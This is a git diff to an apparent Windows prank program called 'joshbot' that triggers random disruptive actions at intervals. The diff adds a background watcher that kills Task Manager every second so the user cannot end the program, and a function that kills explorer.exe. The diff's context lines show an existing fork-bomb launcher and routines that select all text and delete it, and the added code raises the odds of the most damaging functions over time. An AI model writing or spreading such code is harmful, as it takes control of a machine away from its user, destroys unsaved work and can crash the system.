@@ -1,7 +1,7 @@
 import pyautogui as pag
 from pathlib import Path
 from PIL import Image, ImageTk
-import time, pygame, random, ctypes, string, threading, subprocess, requests, keyboard, os
+import time, pygame, random, ctypes, string, threading, subprocess, requests, keyboard, os, psutil, signal
 from pywinauto import Application
 import tkinter as tk
 
@@ -106,7 +106,21 @@ def kill_joshbot():
         print("o7")
         os._exit(0)
     else:
-        print("Nice try.")
+        print("but it refused")
+
+def josh_guard():
+    def _watch():
+        while True:
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'].lower() == "taskmgr.exe":
+                        print("Goodbye, Anthony.")
+                        os.kill(proc.info['pid'], signal.SIGTERM)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+            time.sleep(1)
+    
+    threading.Thread(target=_watch, daemon=True).start()
 
 # Basic functions
 def alt_tab():
@@ -235,6 +249,7 @@ def virtual_insanity():
 
 # Grace functions, these are incredibly detrimental, run at your own risk.
 def htijwbtlgio():
+    play_sound("special_sounds/Hey there it’s Josh,welcome back to Let’s Game It Out!.mp3")
     print("and today we are going to be playing tech support.")
     pag.hotkey("ctrl", "a")
     pag.press("backspace")
@@ -248,6 +263,17 @@ def fork_yourself(killable=killable):
     play_sound("special_sounds/Hope you had fun.mp3")
     time.sleep(3)
     subprocess.Popen(fork_bomb)
+
+def hold_please(killable=killable):
+    for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'].lower() == "explorer.exe":
+                        killable = False
+                        open_notepad("Hold please!")
+                        print("3 hours later")
+                        os.kill(proc.info['pid'], signal.SIGTERM)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
 
 # Dictionary of possible outcomes for the random_function() function. Second value is weight, higher = more likely
 def your_name_is_grace():
@@ -270,6 +296,7 @@ possible_functions = {
 }
 grace_functions = {
     htijwbtlgio: 5,
+    hold_please: 3,
     fork_yourself: 1
 }
 
@@ -283,6 +310,8 @@ def joshing_with_you():
     while True:
         sleep_time = random.randint(min_wait_time, max_wait_time)
         print("Sleeping for " + str(sleep_time) + " seconds")
+
+        # Combo chance
         if random.randint(1, 10) != 1:
             combo = 1
             time.sleep(sleep_time)
@@ -291,6 +320,10 @@ def joshing_with_you():
             print("COMBO x" + str(combo))
             play_sound("special_sounds/combo.mp3")
         threading.Thread(target=random_function).start()
+
+        # Chance to increase odds of grace_mode
+        if random.randint(1, 10) == 1:
+            possible_functions[your_name_is_grace] += 1
 
 # ---------- MAIN PROGRAM ----------
 keyboard.add_hotkey('ctrl+alt+j', kill_joshbot)
@@ -301,5 +334,6 @@ if grace_mode:
 else:
     possible_functions[your_name_is_grace] = 0
 
-threading.Thread(target=joshing_with_you).start()
+#threading.Thread(target=joshing_with_you).start()
+josh_guard()
 root.mainloop()
